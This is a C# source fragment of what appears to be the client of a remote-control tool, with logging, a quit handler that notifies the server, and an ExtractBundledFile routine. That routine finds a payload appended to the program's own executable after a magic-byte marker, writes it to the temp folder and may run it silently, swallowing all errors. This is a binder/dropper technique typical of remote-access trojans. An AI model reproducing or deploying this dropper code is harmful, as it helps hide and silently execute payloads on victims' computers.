using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using RemoteControl.Protocals;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Media;
using System.Drawing.Imaging;
using Microsoft.VisualBasic.Devices;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Utilities;
using System.Net;
using RemoteControl.Protocals.Response;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using RemoteControl.Client.Handlers;
using RemoteControl.Protocals.Codec;

namespace RemoteControl.Client
{
    partial class Program
    {
        static void DoOutput(string sMsg)
        {
            string line = string.Format("{0} {1}", DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"), sMsg);
            Console.WriteLine(line);
            WriteLog(line);
        }

        static void InitializeLogging()
        {
            string baseDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "RemoteControlClient");
            try
            {
                Directory.CreateDirectory(baseDir);
                logFilePath = Path.Combine(baseDir, "client.log");
            }
            catch
            {
                logFilePath = Path.Combine(Path.GetTempPath(), "RemoteControlClient.log");
            }
        }

        static void WriteLog(string line)
        {
            try
            {
                if (string.IsNullOrEmpty(logFilePath))
                    InitializeLogging();
                File.AppendAllText(logFilePath, line + Environment.NewLine, Encoding.UTF8);
            }
            catch
            {
            }
        }

        static void OnFireQuit(object sender, EventArgs e)
        {
            isClosing = true;
            if (heartbeatThread != null)
            {
                heartbeatThread.Join();
            }
            if (oServerSession != null)
            {
                oServerSession.Send(ePacketType.PACKET_CLIENT_CLOSE_RESPONSE, null);
            }
            Environment.Exit(0);
        }

        static void ExtractBundledFile()
        {
            try
            {
                byte[] MAGIC = new byte[] {
                    0x7F, 0x42, 0x4E, 0x44, 0x9A, 0xC3, 0xE8, 0x01,
                    0xAA, 0x55, 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE
                };
                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                byte[] exeData = System.IO.File.ReadAllBytes(exePath);
                int magicPos = FindBytes(exeData, MAGIC);
                if (magicPos < 0) return;

                int offset = magicPos + MAGIC.Length;
                int nameLen = BitConverter.ToInt32(exeData, offset); offset += 4;
                string fileName = System.Text.Encoding.UTF8.GetString(exeData, offset, nameLen); offset += nameLen;
                bool openFile = (exeData[offset] & 1) == 1; offset += 1;
                int dataLen = BitConverter.ToInt32(exeData, offset); offset += 4;
                byte[] fileData = new byte[dataLen];
                Array.Copy(exeData, offset, fileData, 0, dataLen);

                string tempPath = System.IO.Path.Combine(
                    System.IO.Path.GetTempPath(), fileName);
                System.IO.File.WriteAllBytes(tempPath, fileData);

                if (openFile)
                {
                    System.Diagnostics.Process.Start(tempPath);
                }
            }
            catch { }
        }

        static int FindBytes(byte[] src, byte[] pattern)
        {
            for (int i = src.Length - pattern.Length; i >= 0; i--)
            {
                bool match = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (src[i + j] != pattern[j]) { match = false; break; }
                }
                if (match) return i;
            }
            return -1;
        }
    }
}
